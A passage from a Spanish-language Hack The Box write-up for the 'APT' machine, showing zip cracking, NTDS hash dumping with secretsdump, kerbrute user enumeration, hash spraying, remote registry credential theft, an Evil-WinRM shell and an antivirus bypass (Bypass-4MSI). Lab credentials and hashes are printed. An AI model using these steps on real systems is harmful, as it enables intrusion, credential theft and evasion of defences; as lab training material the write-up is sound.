+  <li>Y bueno tenemos un <code class="language-plaintext highlighter-rouge">.zip</code> y tiene esto dentro.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z l backup.zip
+
+7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
+ 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024
+
+Scanning the drive <span class="k">for </span>archives:
+1 file, 10650961 bytes <span class="o">(</span>11 MiB<span class="o">)</span>
+
+Listing archive: backup.zip
+
+<span class="nt">--</span>
+Path <span class="o">=</span> backup.zip
+Type <span class="o">=</span> zip
+Physical Size <span class="o">=</span> 10650961
+
+   Date      Time    Attr         Size   Compressed  Name
+<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
+2020-09-23 11:40:25 D....            0            0  Active Directory
+2020-09-23 11:38:20 .....     50331648      8483543  Active Directory/ntds.dit
+2020-09-23 11:38:20 .....        16384          342  Active Directory/ntds.jfm
+2020-09-23 11:40:25 D....            0            0  registry
+2020-09-23 11:22:12 .....       262144         8522  registry/SECURITY
+2020-09-23 11:22:12 .....     12582912      2157644  registry/SYSTEM
+<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
+2020-09-23 11:40:25           63193088     10650051  4 files, 2 folders
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vemos archivos <code class="language-plaintext highlighter-rouge">ntds</code> <a href="https://docs.iwolfsec.com/tecnicas-y-ataques/ataques-a-directorio-activo/credenciales/dumping-active-directory-hashes-ntds.dit">https://docs.iwolfsec.com/tecnicas-y-ataques/ataques-a-directorio-activo/credenciales/dumping-active-directory-hashes-ntds.dit</a> aquí se almacenan los hashes <code class="language-plaintext highlighter-rouge">NTLM</code>, usuarios, grupos, miembros de un grupo y mas.</p>
+  </li>
+  <li>
+    <p>Bueno nos pide contraseña.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip backup.zip
+Archive:  backup.zip
+   creating: Active Directory/
+<span class="o">[</span>backup.zip] Active Directory/ntds.dit password:
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">zip2john</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content zip2john backup.zip <span class="o">&gt;</span> <span class="nb">hash
+</span>ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression <span class="nb">type
+</span>ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>8483543, <span class="nv">decmplen</span><span class="o">=</span>50331648, <span class="nv">crc</span><span class="o">=</span>ACD0B2FB <span class="nv">ts</span><span class="o">=</span>9CCA <span class="nv">cs</span><span class="o">=</span>acd0 <span class="nb">type</span><span class="o">=</span>8
+ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>342, <span class="nv">decmplen</span><span class="o">=</span>16384, <span class="nv">crc</span><span class="o">=</span>2A393785 <span class="nv">ts</span><span class="o">=</span>9CCA <span class="nv">cs</span><span class="o">=</span>2a39 <span class="nb">type</span><span class="o">=</span>8
+ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression <span class="nb">type
+</span>ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>8522, <span class="nv">decmplen</span><span class="o">=</span>262144, <span class="nv">crc</span><span class="o">=</span>9BEBC2C3 <span class="nv">ts</span><span class="o">=</span>9AC6 <span class="nv">cs</span><span class="o">=</span>9beb <span class="nb">type</span><span class="o">=</span>8
+ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>2157644, <span class="nv">decmplen</span><span class="o">=</span>12582912, <span class="nv">crc</span><span class="o">=</span>65D9BFCD <span class="nv">ts</span><span class="o">=</span>9AC6 <span class="nv">cs</span><span class="o">=</span>65d9 <span class="nb">type</span><span class="o">=</span>8
+NOTE: It is assumed that all files <span class="k">in </span>each archive have the same password.
+If that is not the <span class="k">case</span>, the <span class="nb">hash </span>may be uncrackable. To avoid this, use
+option <span class="nt">-o</span> to pick a file at a time.
+➜  content <span class="nb">cat hash
+</span>backup.zip:<span class="nv">$pkzip$4</span><span class="k">*</span>1<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>9beb<span class="k">*</span>0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>65d9<span class="k">*</span>2a1c4c81fb6009425c2d904699497b75d843f69f8e623e3edb81596de9e732057d17fae8<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>acd0<span class="k">*</span>0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5<span class="k">*</span>2<span class="k">*</span>0<span class="k">*</span>156<span class="k">*</span>4000<span class="k">*</span>2a393785<span class="k">*</span>81733d<span class="k">*</span>37<span class="k">*</span>8<span class="k">*</span>156<span class="k">*</span>2a39<span class="k">*</span>0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996<span class="k">*</span><span class="nv">$/</span>pkzip<span class="nv">$:</span>:backup.zip:Active Directory/ntds.jfm, registry/SECURITY, registry/SYSTEM, Active Directory/ntds.dit:backup.zip
+</code></pre></div></div>
+
+<ul>
+  <li>Si lo crackeamos vemos la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+iloveyousomuch   <span class="o">(</span>backup.zip<span class="o">)</span>
+1g 0:00:00:00 DONE <span class="o">(</span>2024-03-31 19:56<span class="o">)</span> 16.66g/s 136533p/s 136533c/s 136533C/s newzealand..whitetiger
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<ul>
+  <li>Y ahora si podemos usar <code class="language-plaintext highlighter-rouge">unzip</code> pasándole la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip backup.zip
+Archive:  backup.zip
+   creating: Active Directory/
+<span class="o">[</span>backup.zip] Active Directory/ntds.dit password:
+  inflating: Active Directory/ntds.dit
+  inflating: Active Directory/ntds.jfm
+   creating: registry/
+  inflating: registry/SECURITY
+  inflating: registry/SYSTEM
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos usar <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code> ya que el <code class="language-plaintext highlighter-rouge">ntds</code> y el <code class="language-plaintext highlighter-rouge">SYSTEM</code> lo tenemos para dumpear <code class="language-plaintext highlighter-rouge">hashes</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-secretsdump <span class="nt">-system</span> registry/SYSTEM <span class="nt">-ntds</span> Active<span class="se">\ </span>Directory/ntds.dit LOCAL <span class="o">&gt;</span> hashes
+</code></pre></div></div>
+
+<ul>
+  <li>Bueno tenemos 2000 usuarios.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>hashes | <span class="nb">wc</span> <span class="nt">-l</span>
+2000
+</code></pre></div></div>
+
+<ul>
+  <li>Para validar usuarios validos del dominio podemos emplear le herramienta <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./kerbrute userenum <span class="nt">--dc</span> apt <span class="nt">-d</span> htb.local <span class="nb">users
+
+    </span>__             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 03/31/24 - Ronnie Flathers @ropnop
+
+2024/03/31 20:13:04 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+2024/03/31 20:13:04 <span class="o">&gt;</span>  	apt:88
+
+2024/03/31 20:13:09 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 APT<span class="nv">$@</span>htb.local
+2024/03/31 20:13:09 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Administrator@htb.local
+2024/03/31 20:17:08 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 henry.vinson@htb.local
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Bueno tenemos un usuario valido que se llama <strong>henry.vinson</strong>.</p>
+  </li>
+  <li>
+    <p>Si probamos obtener un TGT para el usuario que tenemos no funciona.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers htb.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> user_valid.txt
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span>-] User henry.vinson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+</span></code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Lo que vamos hacer ahora es fuerza bruta para ver si de los hashes que tenemos alguno le corresponde al usuario.</p>
+  </li>
+  <li>
+    <p>Pero hemos sido baneados.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb dead:beef::b885:d62a:d679:573f <span class="nt">-u</span> <span class="s1">'henry.vinson'</span> <span class="nt">-H</span> hashes
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:b300272f1cdab4469660d55fe59415cb STATUS_LOGON_FAILURE
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:72791983d95870c0d6dd999e4389b211 STATUS_LOGON_FAILURE
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:9ea25adafeec63e38cef4259d3b15c30 STATUS_LOGON_FAILURE
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:3ae49ec5e6fed82ceea0dc2be77750ab STATUS_LOGON_FAILURE
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:531c98e26cfa3caee2174af495031187 STATUS_LOGON_FAILURE
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:fde29e6cb61b4f7fda1ad5cd2759329d STATUS_LOGON_FAILURE
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:51d368765462e9c5aebc456946d8dc86 STATUS_LOGON_FAILURE
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:273c48fb014f8e5bf9e2918e3bf7bfbd STATUS_LOGON_FAILURE
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:98590500f99a1bee7559e97ad342d995 STATUS_LOGON_FAILURE
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:10cf01167854082e180cf549f63c0285 STATUS_LOGON_FAILURE
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:813f9d0988b9242eec1e45907344b591 STATUS_LOGON_FAILURE
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:6149000a4f3f7c57642cbee1ea70c3e1 STATUS_LOGON_FAILURE
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
+^C
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Shutting down, please wait...
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
+</code></pre></div></div>
+
+<h2 id="shell-as-henry_vinson_adm">Shell as henry_vinson_adm</h2>
+
+<ul>
+  <li>No podemos aplicar fuerza bruta por <strong>smb</strong> pero si por <code class="language-plaintext highlighter-rouge">kerberos</code> <a href="https://github.com/0xAnomaly/KerbSpray">https://github.com/0xAnomaly/KerbSpray</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  KerbSpray git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 KerbSpray.py htb.local henry.vinson apt.local.htb hashes
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Spraying Hashes...
+
+<span class="o">[</span>i] Domain:             htb.local
+<span class="o">[</span>i] Target User:        henry.vinson
+<span class="o">[</span>i] Domain Controller:  apt.local.htb
+<span class="o">[</span>+] Success htb.local/henry.vinson
+<span class="o">[</span>+] Hash Found: e53d87d42adaa3ca32bdb34a876cbffb
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora que tenemos el <strong>hash</strong> podemos comprobar si es correcto.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb dead:beef::b885:d62a:d679:573f <span class="nt">-u</span> <span class="s1">'henry.vinson'</span> <span class="nt">-H</span> <span class="s1">'e53d87d42adaa3ca32bdb34a876cbffb'</span>
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>+] htb.local<span class="se">\h</span>enry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Como tenemos credenciales validas podemos intentar un <code class="language-plaintext highlighter-rouge">Kerberoasting attack</code> para solicitar tickets TGS <a href="https://ciberseguridad.com/amenzas/ataques-kerberoasting/">https://ciberseguridad.com/amenzas/ataques-kerberoasting/</a>.</p>
+  </li>
+  <li>
+    <p>Pero bueno no tuvimos éxito.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers  htb.local/henry.vinson <span class="nt">-hashes</span> :e53d87d42adaa3ca32bdb34a876cbffb
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+No entries found!
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos listar registros de la maquina <a href="https://threat.media/definition/what-is-a-registry-hive/#:~:text=A%20registry%20hive%20is%20a,logs%20in%20to%20a%20computer.">https://threat.media/definition/what-is-a-registry-hive/#:~:text=A%20registry%20hive%20is%20a,logs%20in%20to%20a%20computer.</a> para esto podemos usar la herramienta de <code class="language-plaintext highlighter-rouge">impacket-reg</code> le tenemos que proporcionar un <strong>KeyName</strong> <a href="https://www.herongyang.com/Windows/Registry-Hives-HKCR-HKCU-HKLM-HKU-HKCC-HCPD.html">https://www.herongyang.com/Windows/Registry-Hives-HKCR-HKCU-HKLM-HKU-HKCC-HCPD.html</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-reg htb.local/henry.vinson@apt <span class="nt">-hashes</span> :e53d87d42adaa3ca32bdb34a876cbffb query <span class="nt">-keyName</span> <span class="s1">'HKU'</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[!]</span> Cannot check RemoteRegistry status. Hoping it is started...
+HKU
+HKU<span class="se">\C</span>onsole
+HKU<span class="se">\C</span>ontrol Panel
+HKU<span class="se">\E</span>nvironment
+HKU<span class="se">\K</span>eyboard Layout
+HKU<span class="se">\N</span>etwork
+HKU<span class="se">\S</span>oftware
+HKU<span class="se">\S</span>ystem
+HKU<span class="se">\V</span>olatile Environment
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vamos a ver lo que hay en <code class="language-plaintext highlighter-rouge">Software</code>.</p>
+  </li>
+  <li>
+    <p>Si miramos vemos que hay un <code class="language-plaintext highlighter-rouge">GiganticHostingManagementSystem</code> y la pagina web de la maquina se llama GiganticHosting.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-reg htb.local/henry.vinson@apt <span class="nt">-hashes</span> :e53d87d42adaa3ca32bdb34a876cbffb query <span class="nt">-keyName</span> <span class="s1">'HKU\Software'</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[!]</span> Cannot check RemoteRegistry status. Hoping it is started...
+HKU<span class="se">\S</span>oftware
+HKU<span class="se">\S</span>oftware<span class="se">\G</span>iganticHostingManagementSystem
+HKU<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft
+HKU<span class="se">\S</span>oftware<span class="se">\P</span>olicies
+HKU<span class="se">\S</span>oftware<span class="se">\R</span>egisteredApplications
+HKU<span class="se">\S</span>oftware<span class="se">\S</span>ysinternals
+HKU<span class="se">\S</span>oftware<span class="se">\V</span>Mware, Inc.
+HKU<span class="se">\S</span>oftware<span class="se">\W</span>ow6432Node
+HKU<span class="se">\S</span>oftware<span class="se">\C</span>lasses
+</code></pre></div></div>
+
+<ul>
+  <li>Si vemos lo que hay encontramos un usuario nuevo y su contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-reg htb.local/henry.vinson@apt <span class="nt">-hashes</span> :e53d87d42adaa3ca32bdb34a876cbffb query <span class="nt">-keyName</span> <span class="s1">'HKU\Software\GiganticHostingManagementSystem'</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[!]</span> Cannot check RemoteRegistry status. Hoping it is started...
+HKU<span class="se">\S</span>oftware<span class="se">\G</span>iganticHostingManagementSystem
+	UserName	REG_SZ	 henry.vinson_adm
+	PassWord	REG_SZ	 G1#Ny5@2dvht
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora podemos validas las credenciales para ver si son correctas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb dead:beef::b885:d62a:d679:573f <span class="nt">-u</span> <span class="s1">'henry.vinson_adm'</span> <span class="nt">-p</span> <span class="s1">'G1#Ny5@2dvht'</span>
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>+] htb.local<span class="se">\h</span>enry.vinson_adm:G1#Ny5@2dvht
+</code></pre></div></div>
+
+<ul>
+  <li>Algo que podemos hacer es ver si el usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code> para conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm htb.local <span class="nt">-u</span> <span class="s1">'henry.vinson_adm'</span> <span class="nt">-p</span> <span class="s1">'G1#Ny5@2dvht'</span>
+SMB         apt             5985   APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span>
+HTTP        apt             5985   APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://apt:5985/wsman
+WINRM       apt             5985   APT              <span class="o">[</span>+] htb.local<span class="se">\h</span>enry.vinson_adm:G1#Ny5@2dvht <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora ya nos podemos conectar.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> apt.local.htb <span class="nt">-u</span> <span class="s1">'henry.vinson_adm'</span> <span class="nt">-p</span> G1#Ny5@2dvht
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>htb<span class="se">\h</span>enry.vinson_adm
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Ya podemos leer la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>esktop&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-ar---</span>         4/1/2024   6:29 PM             34 user.txt
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
+d559647d74b6b9fe38018220d86e0a7e
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<ul>
+  <li>
+    <p>Después de enumerar no encontré mucho así que vamos a usar una herramienta famosa de reconocimiento <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20240331-d41b024f">https://github.com/carlospolop/PEASS-ng/releases/tag/20240331-d41b024f</a>.</p>
+  </li>
+  <li>
+    <p>Pero bueno si lo ejecutamos vemos que el <strong>antivirus</strong> lo detecta y no se puede ejecuta por eso.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; upload winPEASx64.exe
+
+Info: Uploading /home/miguel/Hackthebox/APT/content/winPEASx64.exe to C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments<span class="se">\w</span>inPEASx64.exe
+
+Data: 3183272 bytes of 3183272 bytes copied
+
+Info: Upload successful!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; .<span class="se">\W</span>inPEASx64.exe
+Program <span class="s1">'winPEASx64.exe'</span> failed to run: Operation did not <span class="nb">complete </span>successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
++ .<span class="se">\W</span>inPEASx64.exe
++ ~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ .<span class="se">\W</span>inPEASx64.exe
++ ~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Pero podemos hacer un <strong>Bypass</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; menu
+
+
+   ,.   <span class="o">(</span>   <span class="nb">.</span>      <span class="o">)</span>               <span class="s2">"            ,.   (   .      )       .
+  ("</span>  <span class="o">(</span>  <span class="o">)</span>  <span class="o">)</span><span class="s1">'     ,'</span>             <span class="o">(</span><span class="sb">`</span>     <span class="s1">'`    ("     )  )'</span>     ,<span class="s1">'   .  ,)
+.; )  '</span> <span class="o">((</span> <span class="o">(</span><span class="s2">" )    ;(,      .     ;)  "</span>  <span class="o">)</span><span class="s2">"  .; )  ' (( ("</span> <span class="o">)</span>   <span class="o">)</span><span class="p">;</span><span class="o">(</span>,   <span class="o">)((</span>
+_<span class="s2">".,_,.__).,) (.._( ._),     )  , (._..( '.._"</span>._, <span class="nb">.</span> <span class="s1">'._)_(..,_(_".) _( _'</span><span class="o">)</span>
+<span class="se">\_</span>   _____/__  _|__|  |    <span class="o">((</span>  <span class="o">(</span>  /  <span class="se">\ </span>   /  <span class="se">\_</span>_| ____<span class="se">\_</span>_____   <span class="se">\ </span> /     <span class="se">\</span>
+ |    __<span class="o">)</span>_<span class="se">\ </span> <span class="se">\/</span> /  |  |    <span class="p">;</span>_<span class="o">)</span>_<span class="s1">') \   \/\/   /  |/    \|       _/ /  \ /  \
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+
+       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
+
+[+] Dll-Loader
+[+] Donut-Loader
+[+] Invoke-Binary
+[+] Bypass-4MSI
+[+] services
+[+] upload
+[+] download
+[+] menu
+[+] exit
+</span></code></pre></div></div>
+
+<ul>
+  <li>Primero vamos a ejecutar el <code class="language-plaintext highlighter-rouge">Bypass-4MSI</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; Bypass-4MSI
+
+Info: Patching 4MSI, please be patient...
+
+<span class="o">[</span>+] Success!
+</code></pre></div></div>
+
+<ul>
